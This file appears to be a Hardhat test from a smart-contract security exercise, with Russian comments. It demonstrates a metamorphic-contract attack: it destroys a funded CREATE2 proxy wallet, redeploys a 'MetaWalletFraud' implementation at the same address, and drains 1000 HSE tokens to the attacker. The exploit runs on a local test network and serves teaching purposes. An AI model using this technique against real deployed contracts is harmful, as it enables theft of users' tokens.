const { expect } = require("chai");
const {
  loadFixture,
} = require("@nomicfoundation/hardhat-toolbox/network-helpers");
const { ethers } = require("hardhat");

// npx hardhat export-abi
// npx hardhat clear-abi
const ABI = require("../abi/contracts/MetaContracts.sol/WalletERC20.json");

function buildString(WalletERC20Addr) {
  const trimmedAddr = WalletERC20Addr.slice(2);
  const result =
    "0x5f602d80600a5f3981f3365f5f375f5f5f365f73" +
    trimmedAddr +
    "5af43d82803e903d91602b57fd5bf3";
  return result;
}

describe("MetaContracts", function () {
  async function deployFixture() {
    const [deployer] = await hre.ethers.getSigners();

    const HSE = await ethers.deployContract("HSE");
    await HSE.waitForDeployment();
    const HSEAddr = HSE.target;
    console.log("Адрес HSE токена:", HSEAddr);

    const MetaFactory = await ethers.deployContract("MetaFactory");
    await MetaFactory.waitForDeployment();
    const MetaFactoryAddr = await MetaFactory.getAddress();
    console.log("Адрес фабрики:", MetaFactoryAddr);

    const WalletERC20 = await ethers.deployContract("WalletERC20");
    await WalletERC20.waitForDeployment();
    const WalletERC20Addr = await WalletERC20.getAddress();
    console.log("Адрес реализации:", WalletERC20Addr);

    const salt = 1;
    await MetaFactory.deploy(salt, buildString(WalletERC20Addr));
    const proxyAddr = await MetaFactory.proxys(salt);
    console.log("Адрес прокси:", proxyAddr);

    // подключение к конктракту и инициализация
    let Proxy = new ethers.Contract(
      proxyAddr,
      ABI,
      hre.network.provider
    ).connect(deployer);
    await Proxy.initializer(HSEAddr);
    expect(await Proxy.isInitialized()).to.equal(true);
    expect(await Proxy.token()).to.equal(HSE);

    // баланс кошелька равен 1000
    await HSE.mint(proxyAddr, 1000);
    expect(await HSE.balanceOf(proxyAddr)).to.equal(1000);
    expect(await Proxy.myBalance()).to.equal(1000);

    return { HSE, MetaFactory, Proxy, deployer, HSEAddr };
  }

  it("hack", async function () {
    const { HSE, MetaFactory, Proxy, deployer, HSEAddr } = await loadFixture(
      deployFixture
    );

    // напишите свой контракт и тесты, чтобы получить нужное состояние контракта
    const [frauder] = await hre.ethers.getSigners();

    const MetaWalletFraud = await ethers.deployContract("MetaWalletFraud", []);
    await MetaWalletFraud.waitForDeployment();
    const MetaWalletFraudAddr = await MetaWalletFraud.getAddress();
    console.log("Адрес MetaWalletFraudAddr:", MetaWalletFraudAddr);

    await Proxy.kill();

    console.log('Balance:', await ethers.provider.getBalance(MetaWalletFraud.target))
    const salt = 1;
    await MetaFactory.deploy(salt, buildString(MetaWalletFraudAddr));
    const newProxyAddr = await MetaFactory.proxys(salt);
    console.log("Адрес newProxyAddr:", newProxyAddr);
  
    const ABI2 = require("../artifacts/contracts/MetaWalletFraud.sol/MetaWalletFraud.json");
    let AttackProxy = new ethers.Contract(newProxyAddr, ABI2.abi, hre.network.provider).connect(frauder);
    const frauderAdress = await frauder.getAddress();

    const balanceProxy = await HSE.balanceOf(await AttackProxy.getAddress());
    console.log("Balance of attacker proxy before steal ", balanceProxy); 
    await AttackProxy.transferTokens(HSEAddr, frauderAdress, 1000);

    const balanceProxy2 = await HSE.balanceOf(await AttackProxy.getAddress());
    console.log("Balance of attacker proxy after steal ", balanceProxy2);

    const balanceFrauder = await HSE.balanceOf(frauderAdress);
    console.log("Balance of frauder", balanceFrauder);

    // баланс контракта прокси в токене HSE должен стать 0
    expect(balanceFrauder).to.equal(1000);
    expect(await HSE.balanceOf(newProxyAddr)).to.equal(0);
  });
});
